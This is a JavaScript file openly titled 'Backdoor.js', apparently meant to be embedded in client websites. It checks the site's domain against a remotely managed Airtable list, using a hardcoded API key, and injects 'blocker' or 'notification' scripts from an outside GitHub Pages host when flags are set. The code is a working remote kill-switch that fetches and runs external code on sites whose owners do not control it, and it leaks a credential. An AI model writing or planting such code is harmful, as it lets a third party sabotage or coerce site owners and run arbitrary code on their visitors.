/*!
 * Backdoor.js v1.0.3a
 * (c) 2024-2024
 * by Deus Notam
 * Telegram → https://t.me/d3usn0tam
 */

if (!window.D3usN0tam) {
  console.log("D3usN0tam System - Connected!\n\nMade by D3us N0tam\nNotion Site → https://deusnotam.notion.site/D3usN0tam-System-ba149f69de214fd3ba0b9df834eb2c6e?pvs=4\nTelegram → https://t.me/d3usn0tam");

  // Подключение Airtable API
  var airtableScript = document.createElement('script');
  airtableScript.src = 'https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js';
  document.head.appendChild(airtableScript);

  airtableScript.onload = function () {
    // Ваш ключ API и идентификатор базы данных Airtable
    const apiKey = 'patuoL9R4t4wpFWXS';
    const baseId = 'appyM5LkcacbXYVGh';

    // URL для запросов к Airtable API
    const apiUrl = `https://api.airtable.com/v0/${baseId}/DeusID`;

    // Опции запроса с заголовками для авторизации
    const requestOptions = {
      headers: {
        'Authorization': `Bearer ${apiKey}`
      }
    };

    // Выполнение запроса к Airtable API
    axios.get(apiUrl, requestOptions)
      .then(response => {
        const sites = response.data.records;

        function checkDomain() {
          const currentDomain = window.location.hostname;

          // Проверка, есть ли текущий домен в списке
          const DeusSiteInfo = sites.find(site => {
            const siteHostname = new URL(site.fields.url).hostname;
            return currentDomain === siteHostname || currentDomain === "www." + siteHostname || "www." + currentDomain === siteHostname;
          });

          if (!DeusSiteInfo) {
            console.log("Сайт не найден в списке системы D3usN0tam.\nThe site was not found in the D3usN0tam system list.");
          } else {
            if (DeusSiteInfo.fields.blocker === "active") {
              var blockerScript = document.createElement('script');
              blockerScript.src = 'https://deusnotam.github.io/system/blocker.js';
              document.head.appendChild(blockerScript);
            }
            if (DeusSiteInfo.fields.noti === "active") {
              var deusidScript = document.createElement('script');
              deusidScript.src = 'https://deusnotam.github.io/system/noti.js';
              document.head.appendChild(deusidScript);
            }
          }
        }

        // Вызов функции для проверки домена
        checkDomain();
      })
      .catch(error => {
        console.error('Error fetching data from Airtable:', error);
      });
  };

  // Устанавливаем флаг, что файл подключен
  window.D3usN0tam = true;
}
